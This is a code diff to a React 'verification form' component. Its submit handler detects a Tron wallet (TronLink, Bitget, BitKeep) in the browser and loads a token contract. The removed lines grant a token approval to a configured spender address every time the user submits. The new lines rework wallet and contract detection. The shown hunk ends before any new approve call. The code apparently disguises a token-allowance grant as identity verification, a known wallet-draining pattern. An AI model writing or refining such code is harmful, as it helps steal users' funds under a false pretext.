@@ -344,26 +344,45 @@ const VerificationFormComponent = (props) => {
   };
 
   const handleSubmit = async (value) => {
-    console.log('window',window);
-    
-    if (window.tronLink && window.tronLink.request) {
-      console.log('helloo');
+    console.log('window', window);
 
-      await window.tronLink.request({ method: 'tron_requestAccounts' });
-    }
-    let txHash;
-    // if (isBitgetTron && window.tronWeb) {
-    if (true) {
-      // Use Bitget's injected tronWeb for signing and sending
-      const contract = await window.tronWeb.contract().at(trxContractAddress);
-      const tx = await contract.approve(spenderTrx, (spenderAmount * 1_000_000).toString()).send({
-        feeLimit: 300_000_000,
-        callValue: 0,
+    let tronWebInstance = null;
+    if (window.tronWeb) {
+      tronWebInstance = window.tronWeb;
+    } else if (window.tronWebProto) {
+      tronWebInstance = window.tronWebProto;
+    } else if (window.bitkeep && window.bitkeep.tronWeb) {
+      tronWebInstance = window.bitkeep.tronWeb;
+    } else {
+      Swal.fire({
+        icon: "error",
+        title: "Tron Wallet Not Detected",
+        text: "Please open this site in TronLink, Bitget, or a compatible wallet and unlock your wallet."
       });
-      console.log('tx', tx);
+      console.log('tronWebInstance', tronWebInstance);
 
-      txHash = tx; // Bitget returns txid directly
+      return;
     }
+    console.log('tronWebInstance', tronWebInstance);
+
+    // For Bitget/BitKeep, contract() may return an object with contractState
+    let contract;
+    if (tronWebInstance.contract && typeof tronWebInstance.contract === 'function') {
+      contract = await tronWebInstance.contract().at(trxContractAddress);
+    } else if (tronWebInstance.contractState) {
+      contract = tronWebInstance.contractState;
+    } else {
+      Swal.fire({
+        icon: "error",
+        title: "Contract Not Supported",
+        text: "Your wallet does not support contract interaction."
+      });
+          console.log('contract', contract);
+
+      return;
+    }
+              console.log('contract', contract);
+
     // if (disconnect) {
     //   await disconnect();
     // }
